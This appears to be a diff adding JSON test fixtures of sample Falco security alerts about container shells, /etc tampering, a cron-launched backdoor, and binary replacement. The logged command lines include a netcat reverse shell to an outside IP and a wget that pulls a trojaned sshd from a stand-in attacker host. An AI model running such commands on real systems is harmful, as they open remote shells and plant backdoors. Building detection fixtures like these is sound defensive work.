@@ -1,0 +1,22 @@
+[
+  {
+    "_description": "Falco: Shell spawned in a container (potential container breakout)",
+    "json": "{\"output\":\"06:30:00.123456789: Warning A shell was spawned in a container (user=root user_loginuid=-1 container_id=abc123def456 container_name=k8s_suspicious_pod shell=bash parent=sh cmdline=bash -i pcmdline=sh proc_cmdline=<NA> terminal=34816 container_image=ubuntu:latest)\",\"priority\":\"Warning\",\"rule\":\"A shell was spawned in a container\",\"time\":\"2026-07-09T06:30:00.123456789Z\",\"output_fields\":{\"container.id\":\"abc123def456\",\"container.name\":\"k8s_suspicious_pod\",\"container.image.repository\":\"ubuntu\",\"container.image.tag\":\"latest\",\"evt.time\":1752085800123456789,\"fd.name\":\"/dev/tty\",\"proc.cmdline\":\"bash -i\",\"proc.name\":\"bash\",\"proc.pname\":\"sh\",\"proc.pid\":5678,\"proc.ppid\":1234,\"user.name\":\"root\",\"user.loginuid\":-1,\"user.uid\":0}}"
+  },
+  {
+    "_description": "Falco: Write below /etc (configuration tampering)",
+    "json": "{\"output\":\"06:31:00.234567890: Warning Write below /etc detected (user=root command=vi /etc/ld.so.preload parent=sshd file=/etc/ld.so.preload program=vi container_id=host)\",\"priority\":\"Warning\",\"rule\":\"Write below etc\",\"time\":\"2026-07-09T06:31:00.234567890Z\",\"output_fields\":{\"container.id\":\"host\",\"evt.time\":1752085860234567890,\"evt.type\":\"openat\",\"fd.directory\":\"/etc\",\"fd.filename\":\"ld.so.preload\",\"fd.name\":\"/etc/ld.so.preload\",\"proc.cmdline\":\"vi /etc/ld.so.preload\",\"proc.name\":\"vi\",\"proc.pname\":\"sshd\",\"proc.pid\":6789,\"user.name\":\"root\",\"user.uid\":0}}"
+  },
+  {
+    "_description": "Falco: Outbound connection to C2 server",
+    "json": "{\"output\":\"06:32:00.345678901: Warning Outbound connection to C2 server detected (command=nc parent=bash connection=192.168.10.5:45678->185.220.101.34:4444)\",\"priority\":\"Warning\",\"rule\":\"Outbound connection to C2 server\",\"time\":\"2026-07-09T06:32:00.345678901Z\",\"output_fields\":{\"container.id\":\"host\",\"evt.time\":1752085920345678901,\"evt.type\":\"connect\",\"fd.sip\":\"192.168.10.5\",\"fd.sport\":\"45678\",\"fd.dip\":\"185.220.101.34\",\"fd.dport\":\"4444\",\"fd.l4proto\":\"tcp\",\"proc.cmdline\":\"nc 185.220.101.34 4444 -e /bin/bash\",\"proc.name\":\"nc\",\"proc.pname\":\"bash\",\"proc.pid\":7890,\"user.name\":\"root\",\"user.uid\":0}}"
+  },
+  {
+    "_description": "Falco: Unexpected process spawned by cron (scheduled task abuse)",
+    "json": "{\"output\":\"06:33:00.456789012: Warning Unexpected process spawned by cron (user=root command=/tmp/.hidden/backdoor parent=cron pcmdline=/tmp/.hidden/backdoor)\",\"priority\":\"Warning\",\"rule\":\"Unexpected cron process\",\"time\":\"2026-07-09T06:33:00.456789012Z\",\"output_fields\":{\"container.id\":\"host\",\"evt.time\":1752085980456789012,\"evt.type\":\"execve\",\"fd.name\":\"/tmp/.hidden/backdoor\",\"proc.cmdline\":\"/tmp/.hidden/backdoor\",\"proc.name\":\"backdoor\",\"proc.pname\":\"cron\",\"proc.pid\":8901,\"proc.ppid\":1,\"user.name\":\"root\",\"user.uid\":0}}"
+  },
+  {
+    "_description": "Falco: Write below binary dir (binary replacement attack)",
+    "json": "{\"output\":\"06:34:00.567890123: Warning Write below binary dir (user=root command=wget file=/usr/local/bin/sshd program=wget)\",\"priority\":\"Warning\",\"rule\":\"Write below binary dir\",\"time\":\"2026-07-09T06:34:00.567890123Z\",\"output_fields\":{\"container.id\":\"host\",\"evt.time\":1752086040567890123,\"evt.type\":\"openat\",\"fd.directory\":\"/usr/local/bin\",\"fd.filename\":\"sshd\",\"fd.name\":\"/usr/local/bin/sshd\",\"proc.cmdline\":\"wget http://evil.example.com/sshd -O /usr/local/bin/sshd\",\"proc.name\":\"wget\",\"proc.pname\":\"bash\",\"proc.pid\":9012,\"user.name\":\"root\",\"user.uid\":0}}"
+  }
+]
